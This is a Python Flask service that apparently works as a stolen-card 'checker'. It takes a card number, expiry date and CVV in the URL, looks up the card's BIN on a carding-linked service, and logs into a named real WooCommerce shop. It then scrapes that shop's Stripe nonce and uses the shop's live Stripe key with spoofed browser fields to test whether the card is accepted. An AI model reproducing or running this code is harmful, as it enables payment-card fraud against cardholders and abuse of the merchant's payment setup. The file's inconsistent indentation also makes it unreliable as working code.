from flask import Flask, jsonify, Response
import requests
import re
import json
from typing import Any, Dict

app = Flask(__name__)

@app.route('/')
def home() -> str:
    return "API is running. Use /add_payment_method/<user>/<passw>/<details> to add payment methods."

@app.route('/add_payment_method/<user>/<passw>/<details>', methods=['GET'])
def add_payment_method(user: str, passw: str, details: str) -> Response:
   try:
        # Extract card details from URL path
        parts: list[str] = details.split('|')
        if len(parts) != 4:
            return jsonify({'error': 'Invalid card details format. Use cc|mm|yy|cvv'}), 400
        cc, mm, yy, cvv = parts
        if not all([cc, mm, yy, cvv]):
            return jsonify({'error': 'Missing required card details'}), 400

        # Fetch BIN info
        bin_number: str = cc[:6]
        bin_url: str = f"https://bins.antipublic.cc/bins/{bin_number}"
        bin_response: requests.Response = requests.get(bin_url)
        if bin_response.status_code == 200:
            bin_info: Dict[str, Any] = bin_response.json()
            country: str = bin_info.get('country', 'US')
       else:
            bin_info: Dict[str, Any] = {"error": "BIN info not found or request failed"}
            country: str = 'US'

        # Create a session to persist cookies across requests
        session: requests.Session = requests.Session()

       # Common headers
       headers: Dict[str, str] = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
            'referer': 'https://www.dsegni.com/en/my-account/',
        }

       # Step 1: Login to the account
        login_url: str = 'https://www.dsegni.com/en/my-account/'
        login_page: requests.Response = session.get(login_url, headers=headers)
        login_html: str = login_page.text

       # Extract WooCommerce login nonce
        nonce_match = re.search(r'name="woocommerce-login-nonce" value="([^"]*)"', login_html)
       if not nonce_match:
            return jsonify({'error': 'Login nonce not found'}), 500
        login_nonce: str = nonce_match.group(1)

       # Perform login
       login_data: Dict[str, str] = {
            'username': user,
            'password': passw,
           'rememberme': 'forever',
           'woocommerce-login-nonce': login_nonce,
            'login': 'Log in',
        }
        login_response: requests.Response = session.post(login_url, headers=headers, data=login_data)

       # Basic check if login succeeded
        if 'dashboard' not in login_response.text.lower() and 'my account' not in login_response.text.lower():
            return jsonify({'error': 'Login failed - check credentials'}), 401

        # Step 2: Fetch the add payment method page (now authenticated)
        page_url: str = 'https://www.dsegni.com/en/my-account/add-payment-method/'
        page_response: requests.Response = session.get(page_url, headers=headers)
        html: str = page_response.text

       # Extract Stripe params (wc_stripe_params or wc_stripe_upe_params)
       pattern: str = r"var\s+(wc_stripe_(?:upe_)?params)\s*=\s*(\{.*?\});"
        match = re.search(pattern, html, re.DOTALL)
        if not match:
           return jsonify({'error': 'Stripe params not found on page'}), 500
        params_str: str = match.group(2)

       # Clean trailing commas in JSON (common in inline scripts)
       params_str = re.sub(r",\s*}", "}", params_str)
       params_str = re.sub(r",\s*]", "]", params_str)
        wc_params: Dict[str, Any] = json.loads(params_str)

       # Get the correct nonce for creating setup intent
       ajax_nonce: str | None = wc_params.get('createAndConfirmSetupIntentNonce')
        if not ajax_nonce:
            # Fallback: look for any relevant nonce
            possible_nonces: list[str] = [k for k in wc_params.keys() if

'nonce' in k.lower() and ('setup' in k.lower() or 'intent' in k.lower())]
           if possible_nonces:
                ajax_nonce = wc_params.get(possible_nonces[0])
            else:
                return jsonify({'error': 'No valid nonce found for setup intent'}), 500

        # Step 3: Create payment method directly via Stripe API
       stripe_headers: Dict[str, str] = {
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
           'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
        }
        stripe_data: str = (
            f'type=card'
            f'&card[number]={cc}'
            f'&card[cvc]={cvv}'
            f'&card[exp_year]={yy}'
            f'&card[exp_month]={mm}'
            f'&allow_redisplay=unspecified'
           f'&billing_details[address][postal_code]=10009'
            f'&billing_details[address][country]={country}'
            f'&pasted_fields=number'
            f'&payment_user_agent=stripe.js%2Fc264a67020%3B+stripe-js-v3%2Fc264a67020%3B+payment-element%3B+deferred-intent'
            f'&referrer=https%3A%2F%2Fwww.dsegni.com'
            f'&time_on_page=54564'
            f'&key=pk_live_51QRZhrL6aoF88vwvP6Vh6hyLFEAMPSBMDTBYEbnmGLvkLgb0iNL2LgYW5WsP0DSdZ7bPs6bfYh60kaKoPPvXZpdT00NKqT2x9i'
            f'&_stripe_version=2024-06-20'
        )
        pm_response: requests.Response = requests.post(
            'https://api.stripe.com/v1/payment_methods',
            headers=stripe_headers,
            data=stripe_data
        )
        pm_json: Dict[str, Any] = pm_response.json()
       if 'error' in pm_json:
            return jsonify({'error': f"Stripe PM creation failed: {pm_json['error']['message']}"}), 500
        pm_id: str = pm_json['id']

        # Step 4: Confirm setup intent via WooCommerce AJAX
        ajax_headers: Dict[str, str] = {
            'accept': '*/*',
           'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.dsegni.com',
            'referer': 'https://www.dsegni.com/en/my-account/add-payment-method/',
            'x-requested-with': 'XMLHttpRequest',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
        }
        ajax_data: Dict[str, str] = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': pm_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': ajax_nonce,
        }
        final_response: requests.Response = session.post(
            'https://www.dsegni.com/wp-admin/admin-ajax.php',
            headers=ajax_headers,
            data=ajax_data
        )
        final_json: Dict[str, Any] = final_response.json() if final_response.headers.get('content-type', '').startswith('application/json') else {'raw': final_response.text}
       return jsonify({
            'success': True,
            'payment_method_id': pm_id,
            'final_response': final_json,
            'bin_info': bin_info
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    app.run(debug=True)
